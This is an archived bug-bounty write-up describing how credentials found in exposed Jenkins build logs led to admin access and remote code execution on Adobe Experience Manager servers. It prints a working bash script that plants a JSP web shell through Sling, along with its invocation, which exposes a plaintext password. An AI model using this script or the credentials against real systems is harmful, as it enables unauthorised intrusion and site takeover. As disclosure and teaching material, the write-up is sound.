---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-04_exposed-jenkins-to-rce-on-8-adobe-experience-managers.md
original_filename: 2019-09-04_exposed-jenkins-to-rce-on-8-adobe-experience-managers.md
title: Exposed Jenkins to RCE on 8 Adobe Experience Managers
category: documents
detected_topics:
- command-injection
- supply-chain
tags:
- imported
- documents
- command-injection
- supply-chain
language: en
raw_sha256: 98f34d7582229d7240a9718d30b099624e3f284f9a2dc46327ff2104ad60fc64
text_sha256: 008ce3a6a881e67665f7bb06b8f218fad91c7d7de6daa06bb7c08fd022f753a4
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: true
---

# Exposed Jenkins to RCE on 8 Adobe Experience Managers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-04_exposed-jenkins-to-rce-on-8-adobe-experience-managers.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: True
- Raw SHA256: `98f34d7582229d7240a9718d30b099624e3f284f9a2dc46327ff2104ad60fc64`
- Text SHA256: `008ce3a6a881e67665f7bb06b8f218fad91c7d7de6daa06bb7c08fd022f753a4`


## Content

---
title: "Exposed Jenkins to RCE on 8 Adobe Experience Managers"
url: "https://corben.io/blog/19-9-04-jenkins-to-full-pwnage"
final_url: "https://corben.io/blog/19-9-04-jenkins-to-full-pwnage"
authors: ["Corben Leo (@hacker_)"]
bugs: ["RCE", "Exposed Jenkins instance"]
publication_date: "2019-09-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5050
---

[BACK](/)

# Exposed Jenkins to RCE on 8 Adobe Experience Managers

AuthorCORBEN LEO

Published2019.09.04

### Introduction:

This is a short write-up of how I progressed from discovering a Jenkins instance to getting shells on 8 Adobe Experience Manager servers and gaining edit access to a company's main sites. Along with this blog-post, I'm releasing a tool called [jenkinz](https://github.com/lc/jenkinz).

**Note:** as this was a finding in a private program, I'm not allowed to disclose any details that could be used to identify them. For this reason, I've changed and redacted details.

### Recon

Back in June, I decided to change my workflow and automate more of my recon. After doing so, I decided to perform a test scan against a private program I was in. After the scan finished, I started looking through the HTTP titles of every subdomain it had discovered.

One in particular caught my eye: `Dashboard [Jenkins] - https://wcm-pipeline03.dev.test.example.com`

I visited the subdomain and found that it was indeed running Jenkins. In the past I have had success getting Code Execution on Jenkins via Orange Tsai's [research](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), so I tried that but unfortunately it was patched.

However, the `/signup` endpoint was enabled, so I registered for an account and logged in, and started looking at the builds: `https://wcm-pipeline03.dev.test.example.com/view/all/builds`.

I'm a huge sucker for Continuous Integration applications and I've done some [research](https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here) on finding secrets in build logs on TravisCI. Since this Jenkins server was running the latest version and there weren't any public vulnerabilities in it, I decided to go down a different route: finding secrets in build logs.

Just like with Travis-CI, it would be an incredibly tedious task to manually retrieve every build log and environment variable for every job, so I automated all of it.

### jenkinz -> secrets -> rce

[jenkinz](https://github.com/lc/jenkinz) is the the tool that came out of this; it retrieves every build (log and environment variables) for every job ever created and run on a given Jenkins instance and saves them all to an output directory.

After running the tool, I had a large amount of data through. `ripgrep` is great for this - after searching for a few different strings, I found credentials in one of the logs:
  
  
  found credentials for id: aem-ingress -> username: aemingress Password=***REDACTED***

By reading through the entire log file, it was evident that this job was a script that logged into several Adobe Experience Manager servers, performed some tasks, then emailed a developer. I had discovered and tested a few of their AEM instances in the past, so I went back through my historical recon data, searched on Github, and found 8 of their AEMs.

The credentials worked and I was an admin on all of them.

Next, I took a [bash script](https://github.com/0ang3el/aem-hacker/blob/master/aem-rce-sling-script.sh) by [0ang3el](https://twitter.com/0ang3el) and modified it to only run the `uname` command:
  
  
  #!/usr/bin/bash
  
  if [ "$#" -ne 3 ]; then
  echo "Usage: $0 URL USERNAME PASSWORD"
  exit 2
  fi
  
  url="$1"
  username="$2"
  password=***REDACTED***
  
  payload=$(cat <<-EOT
  <%@ page import="java.io.*" %>
  <%
  Process proc = Runtime.getRuntime().exec('uname -a');
  
  BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
  StringBuilder sb = new StringBuilder();
  String s = null;
  while ((s = stdInput.readLine()) != null) {
  sb.append(s + "\\\\n");
  }
  
  String output = sb.toString();
  %>
  <%=output %>
  EOT
  )
  
  echo "$payload" > /tmp/html.jsp
  
  #Create rcetype
  curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/apps/rcetype" -Fhtml.jsp=@/tmp/html.jsp > /dev/null
  
  # Create rcenode
  curl -k -s -X POST -H "Referer: $url" -u "$username:$password" "$url/rcenode" -Fsling:resourceType=rcetype > /dev/null
  
  echo "Now navigate to $url/rcenode.html"

Running it with the credentials I'd found:
  
  
  $ bash aem-rce-sling.script.sh http://aem-instance.example.com "aemingress" "Goodbye2017!"
  
  Now navigate to https://aem-instance.example.com/rcenode.html

After navigating to the URL, the `uname -a` command executed.

Not only did I have RCE though, I had full privileges and could've deleted or edited all of their main sites, including their subsidiaries in AEM:

`http://aem-instance.example.com/editor.html/content/example/example_com/us/en/home/index.html`

## Outro:

I had a super fun time with this vulnerability and I enjoyed tooling it. Hopefully in your bug-bounty, pentesting, and/or red-teaming journey, the [tool](https://github.com/lc/jenkinz) is useful!

Happy hacking,

**Corben Leo**
